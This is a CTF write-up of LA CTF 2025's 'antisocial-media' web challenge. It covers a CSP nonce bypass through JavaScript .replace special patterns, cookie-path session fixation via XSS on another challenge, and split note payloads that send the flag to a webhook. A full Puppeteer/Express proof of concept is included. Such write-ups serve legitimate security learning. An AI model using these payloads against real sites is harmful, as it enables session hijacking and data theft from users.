---
title: "LA CTF 2025 web/antisocial-media Writeup"
description: "A detailed write up of the CTF challenge antisocial-media from LA CTF 2025, involving xss with special replacement patterns in the JavaScript .replace function."
date: "Feb 10 2025"
tags: ["write up", "ctf", "xss"]
---

### Introduction
I played LA CTF 2025 with Black Bauhinia, and got the second blood on antisocial-media, which had 5 solves at the end of the CTF. I found this challenge to be quite interesting, as it used a lot of concepts I was familiar with, yet still not the easiest task to do. Big thanks to teammate @ozetta for helping me with this task!

### Challenge Details
> Description: A brand new platform, just for yourself!

> This task allows for users to make notes on the app, with a `/flag` endpoint that is only available to the admin bot.

### Going into the challenge
Interestingly, I immediately noticed one thing with the note creation part in `index.js`, specifically here:
```js=
app.use((_, res, next) => {
    res.locals.nonce = crypto.randomBytes(32).toString("base64");
    res.setHeader("Content-Security-Policy", `default-src 'self'; script-src 'nonce-${res.locals.nonce}'`);
    next();
});

async function renderTemplate(view, params) {
    const template = await fs.readFile(`views/${view}.html`, { encoding: "utf8" });
    const html = Object.entries(params).reduce(
        (p, [k, v]) => p.replace(new RegExp(`{{${k}}}`, "g"), v),
        template
    );

    if (!params.notes) {
        return html;
    }

    return html.replace(
        "{{...notes}}",
        `[${
            params.notes.map(
                n => `'${n.
                    replace(/'/g, "&apos;").
                    replace(/\n/g, "").
                    replace(/\r/g, "").
                    replace(/\\/g, "\\\\")
                    }'`
            ).join(", ")
        }]`);
}
```

What was the part I immediately noticed? Well, I played AlpacaHack Round 2 (Web) authored by Ark recently, and in it was the question **Pico Note 1**, which uses the trick of special replacement patterns in `.replace` to inject arbitrary scripts and bypass script nonce.

(The first part of this challenge is eerily similar with Pico Note 1)<br>
Here is Ark's writeup if you want to take a look at that first: https://blog.arkark.dev/2024/09/04/alpacahack-round-2/

Anyways, the TLDR is that `.replace` not only replaces the things you asked it to replace, but also as this interesting feature called special replacement patterns:
![image](/images/upload_1b845f279c3b05e62c1ea0ce6a7792e9.png)

```js
// To illustrate
const payload = "aaabbbccc";

console.log(payload.replace("bbb", "$`lol"))
/// Part preceding "bbb" is "aaa", thus "aaalol"
// aaaaaalolccc
console.log(payload.replace("bbb", "$'lol"))
/// Part following "bbb" is "ccc", thus "ccclol"
// aaaccclolccc
```

### Abusing .replace

How does this help? Well, see for yourself:
```js
const html = `    
<script nonce="{{nonce}}">
    const note = {{...notes}};
`;

const payload = "$`</script>$`""; custom script with nonce! //";

console.log(html.replace(
        "{{...notes}}",
        `['${payload.
                    replace(/'/g, "&apos;").
                    replace(/\n/g, "").
                    replace(/\r/g, "").
                    replace(/\\/g, "\\\\")
                    }']`))
```
```html
<!-- Theoretical output -->
<script nonce="{{nonce}}">
    const note = ['$`</script>$`""; custom script with nonce! //'];
<!-- 
Now simply replace $` with the stuff before {{...notes}}:
<script nonce="{{nonce}}">
    const note =
-->
```
```html
<!-- Output -->
<script nonce="{{nonce}}">
    const note = [' 
<script nonce="{{nonce}}">
    const note = </script> 
<script nonce="{{nonce}}">
    const note = ""; custom script with nonce! //'];
```

Now, we already know roughly what notes we need to insert to achieve XSS and steal the flag, but then I realised... Where do I insert the notes???

### Inserting the notes

Normally you would have the bot visit your profile and view your notes, but this time, everything is stored in your express session, meaning YOU, the user had to be the one who inserted the notes.

My first thought was through CSRF, but after some researching, I found that because the `express.json()` used checks for the `application/json` content type header, it was impossible to perform CSRF. (Unless it was years ago when flash was supported in major browsers...)

After failing for hours, with seemingly no way to insert notes for the bot, I thought of the good old CTF web trick, using other challenges to "cheese" it. Realistically, this wasn't going to be a "cheese" as we determined that there was no other proper way to do so.

I confirmed this functionality by making the antisocial-media admin bot visit another challenge, `web/purell`, which allows for easy XSS and made it ping my webhook if the bot visited, and indeed, it did!

This still doesn't mean that you can easily insert notes due to cross domain restrictions. However, if you noticed, the express session is stored as a cookie, and if you simply replace the session id with one of your owns(with notes inserted), you could load arbitrary notes onto the bot's profile.

I was unable to get the log out endpoint to remove the session ids from the admin bot, however @ozetta reminded me that you can simply make a cookie with higher priority by setting a more specific path for it. In other words, by making a cookie with `path=/profile`, you can effectively override the original cookie as the more specific path is preferred.

With this, we basically only had to follow these steps to get the flag:
1. Make an account and insert notes which sends the contents of `/flag` to our webhook
2. Copy the session id from that account
3. Put that session id into the admin bot
4. Redirect the admin bot back to `/profile` to steal the flag from `/flag`

### Crafting the payload

To do the first step, @ozetta figured out this insane payload:
```js
const notes = [
  "$`</script>$`/*",
  "*/1;fetch(/*",
  '*/"/flag"/*',
  "*/,{method:/*",
  '*/"post"})./*',
  "*/then(_=>_./*",
  "*/text())./*",
  "*/then(_=>{/*",
  "*/location=/*",
  "*/name+_})//",
];
```

It utilises `window.name` to save the url of our webhook, which is the most lengthy component. While `/*` and `*/` are for commenting the added `, ` between notes.

Why did we need such a weird payload? Because of this check which applies strict constraints on our payload.
```js
// We aren't web scale yet! :)
if (note.length > 15 || req.session.notes.length > 15) {
    res.status(400).send({ success: false });
    return;
}
```

By adding the notes via a **fetch** request, we can complete step 1 and 2.

To do step 3, we utilise `web/purell`, which allows us to execute insert arbitrary HTML, and run the following code:
```html
<script>
  const sid = "{{id from step 2}}";
  const html = `<img/src/onerror='document.cookie="connect.sid=\${sid}; domain=.chall.lac.tf; path=/profile"; window.location="${chall}/profile";'>`;

  window.name = "{{webhook}}?";
  window.location = "https://purell.chall.lac.tf/level/start?html=" + encodeURIComponent(html);
</script>
```

This achieves step 3 and step 4, as the code inside `<img/src/onerror>` sets the more prioritized cookie AND changes the `window.location` to `/profile` to load the notes.

Now we feed the html above to the admin bot, and wait for our flag to be sent to the webhook!
![image](/images/upload_83d21f44220ae1d44d2b1f573913cfb5.png)

### PoC
Combining everything above, here is the full PoC!
```js=
import puppeteer from "puppeteer-core";
import express from "express";

const chall = "https://antisocial-media.chall.lac.tf",
  hook = "https://webhook.site/...";
let cookie = "";

const browser = await puppeteer.launch({
  headless: "new",
  executablePath: "...",
});

try {
  const page = await browser.newPage();

  await page.goto(chall);
  await page.waitForSelector("#username");
  await page.type("#username", "aaaaaaaaaaaaaaaaaa");
  await page.type("#password", "aaaaaaaaaaaaaaaaaa");
  await page.click("#login");
  await page.waitForNavigation();

  await page.evaluate(async () => {
    const notes = [
      "$`</script>$`/*",
      "*/1;fetch(/*",
      '*/"/flag"/*',
      "*/,{method:/*",
      '*/"post"})./*',
      "*/then(_=>_./*",
      "*/text())./*",
      "*/then(_=>{/*",
      "*/location=/*",
      "*/name+_})//",
    ];

    for (let i = 0; i < notes.length; i++) {
      const note = notes[i];
      console.log(
        await fetch("/api/notes", {
          headers: {
            "content-type": "application/json",
          },
          body: JSON.stringify({
            note,
          }),
          method: "POST",
          mode: "cors",
          credentials: "include",
        })
      );
    }
  });

  await new Promise((r) => setTimeout(r, 5000));

  cookie = (await browser.cookies())[0].value;
  await page.close();
} catch (e) {
  console.error(e);
}

await browser.close();

const app = express();

app.get("/", function (req, res) {
  res.setHeader("Content-Type", "text/html");
  res.send(`
<script>
  const sid = "${cookie}";
  const html = \`<img/src/onerror='document.cookie="connect.sid=\${sid}; domain=.chall.lac.tf; path=/profile"; window.location="${chall}/profile";'>\`;

  window.name = "${hook}?";
  window.location = "https://purell.chall.lac.tf/level/start?html=" + encodeURIComponent(html);
</script>
  `);
});

// This pages serves the HTML you feed to the admin bot
app.listen(8080);
console.log("Listening on 8080");
```